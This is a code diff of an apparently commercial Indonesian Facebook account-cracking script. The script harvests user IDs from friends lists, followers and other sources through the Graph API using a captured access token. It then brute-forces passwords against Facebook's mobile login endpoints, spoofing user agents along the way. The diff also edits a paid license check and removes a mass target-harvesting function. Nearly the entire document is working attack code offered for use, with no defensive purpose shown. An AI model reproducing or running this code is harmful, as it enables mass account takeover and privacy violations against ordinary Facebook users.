@@ -258,41 +258,39 @@ def Menu():
 	banner()
 	print('')
 	print('')
-	print (' %s[%s01%s] %sCrack dari publik'%(O,P,O,P))
-	print (' %s[%s02%s] %sCrack %sUNLIMITED'%(O,P,O,P,H))
-	print (' %s[%s03%s] %sCrack dari follower'%(O,P,O,P))
-	print (' %s[%s04%s] %sCrack dari reaction post'%(O,P,O,P))
-	print (' %s[%s05%s] %sCrack dari komentar post'%(O,P,O,P))
-	print (' %s[%s06%s] %sCrack dari anggota group'%(O,P,O,P))
-	print (' %s[%s07%s] %sCrack dari pencarian nama'%(O,P,O,P))
-	print (' %s[%s08%s] %sCrack dari pesan mesengger'%(O,P,O,P))
-	print (' %s[%s09%s] %sCrack dari saran teman'%(O,P,O,P))
-	print (' %s[%s10%s] %sLihat hasil crack'%(O,P,O,P))
-	print (' %s[%s11%s] %sCheckpoint detektor'%(O,P,O,P))
-	print (' %s[%s12%s] %sCek ID'%(O,P,O,P))
-	print (' %s[%s13%s] %sSpam limited editon'%(O,P,O,P))
+	print (' %s[%s01%s] %sCrack dari daftar teman '%(O,P,O,P))
+	print (' %s[%s02%s] %sCrack dari total pengikut'%(O,P,O,P))
+	print (' %s[%s03%s] %sCrack dari reaction post'%(O,P,O,P))
+	print (' %s[%s04%s] %sCrack dari komentar post'%(O,P,O,P))
+	print (' %s[%s05%s] %sCrack dari anggota group'%(O,P,O,P))
+	print (' %s[%s06%s] %sCrack dari pencarian nama'%(O,P,O,P))
+	print (' %s[%s07%s] %sCrack dari pesan mesengger'%(O,P,O,P))
+	print (' %s[%s08%s] %sCrack dari saran teman'%(O,P,O,P))
+	print (' %s[%s09%s] %sLihat hasil crack'%(O,P,O,P))
+	print (' %s[%s10%s] %sCheckpoint detektor'%(O,P,O,P))
+	print (' %s[%s11%s] %sCek ID'%(O,P,O,P))
+	print (' %s[%s12%s] %sSpam limited editon'%(O,P,O,P))
 	print (' %s[%srm%s] %sHapus data login'%(O,P,O,P))
 	pilih(token,coki)
 
 def activate_licensi():
 	os.system("clear")
-	logo()
-	print("\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk mendapatkan lisensi script dari admin....terima kasih\n")
-	key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
+	print("\n\n\x1b[1;97mSudah mempunyai licensi key? ketik \x1b[1;95madmin\x1b[1;97m untuk chat admin, ketik \x1b[1;92mgets\x1b[1;97m untuk mengambil licensi melalui website RATUERROR\n")
+	key = input(" [>] licensi: ").lower()
 	if "gets" in key:
-		os.system("xdg-open https://licensi.brutefb.my.id/register.php")
+		os.system("xdg-open https://fbkey.ratuerror.com/register/")
 		activate_licensi()
 	elif "admin" in key:
-		os.system("xdg-open https://wa.me/6287799183568?text=RATU%20COLMEXs....beli%20lisensi%20dooong")
+		os.system("xdg-open https://wa.me/6287799183568?text=Jessica%20cantik....beli%20lisensi%20dooong")
 		activate_licensi()
 	else:
-		gets = requests.get("https://licensi.brutefb.my.id/api.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
+		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
 		if "error" in gets["status"]:
 			exit(" [×] message: "+gets["msg"]+"\n\n")
 		elif "berlaku" in gets["status"]:
 			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
 			open(".licensi","w").write(key.strip())
-			menu()
+			Menu()
 			os.system("clear")
 		elif "kadaluarsa" in gets["status"]:
 			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
@@ -306,9 +304,9 @@ def pilih(token,coki):
 	elif slut in['1','01']:
 		PublikGRAPH(token,coki)
 	elif slut in['2','02']:
-		MassalPublikGRAPH(token,coki)
-	elif slut in['3','03']:
 		FollowGRAPH(token,coki)
+	elif slut in['3','03']:
+		ComingSoon()
 	elif slut in['4','04']:
 		ComingSoon()
 	elif slut in['5','05']:
@@ -319,11 +317,9 @@ def pilih(token,coki):
 		ComingSoon()
 	elif slut in['8','08']:
 		ComingSoon()
-	elif slut in['9','09']:
-		ComingSoon()
 	#elif slut in['9','09']:
 		#useragent()
-	elif slut in['10','10']:
+	elif slut in['9','09']:
 		hasil_fb()
 	elif slut in['10']:
 		file_cp()
@@ -352,32 +348,6 @@ def PublikGRAPH(token,cookie):
 		exit("\n%s GAGAL %smengambil usename/ID....."%(M,P))
 		
 	return Crack().romiy(id)
-	
-#--- CRACK UNLILMITED
-def MassalPublikGRAPH(token,cookie):
-	try:
-		jum = int(input('%s╰─ %sjumlah target %s > %s'%(P,O,M,K)))
-	except:jum=1
-	print ("\n %sPastikan daftar teman bersifat %sPUBLIK "%(P,H))
-	for t in range(jum):
-		t +=1
-		try:
-			try:
-				user = input('%s╰─ %susername/ID publik %s%s%s > %s'%(P,O,P,H,M,K))
-				if user in['100067807565861','100028434880529','romi.afrizal.102','romi.alfarabi','']:
-					exit('%s╰─%s gak usah tolol'%(P,M))
-			except AttributeError:
-				exit('%s╰─%s %s tidak di temukan'%(P,M,user))
-			else:
-				po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
-				for i in po['friends']['data']:
-					id.append(f"{i['id']}<=>{i['name']}")
-		except KeyError:
-			exit("\n%s GAGAL %smengambil usename/ID....."%(M,P))
-	print (f'\r{P}╰─{O} mengumpulkan id{M} >{H} {len(id)} ')
-	
-	return Crack().romiy(id)
-
 
  # CRACK FOLOWERS 
 def FollowGRAPH(token,cookie):
@@ -459,7 +429,7 @@ def uas(_romz_):
 			os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2)
 			useragent(_romz_)
 		elif ua in("CANCEL","Cancel","cancel"):
-			ua_ = ("NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991B/G991BXXS2AU BB) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36 UNTRUSTED/1.0")
+			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 			open("ua.txt","w").write(ua_);jeda(2)
 			print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2)
 			Menu()
@@ -712,7 +682,7 @@ class Crack:
 			for pw in manual:
 				pw = pw.lower()
 				ses = requests.Session()
-				ua = ("Mozilla/5.0 (X11; SuperGamer 3 Linux i686; rv:60.0) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/11.0 Safari/600.6.3")
+				ua = random.choice(["Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba"])
 				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
@@ -783,7 +753,7 @@ class Crack:
 			for pw in manual:
 				pw = pw.lower()
 				ses = requests.Session()
-				ua = ("Mozilla/5.0 (Linux; Android 11; Pixel 2; DuplexWeb-Google/1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Mobile Safari/537.36")
+				ua = ("NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+ UNTRUSTED/1.0")
 				ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'empty','accept-language': 'en-US,en;q=0.9,es;q=0.8,es-MX;q=0.7'})
 				p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://m.facebook.com/login.php","flow":"login_no_pin","pass":pw,}
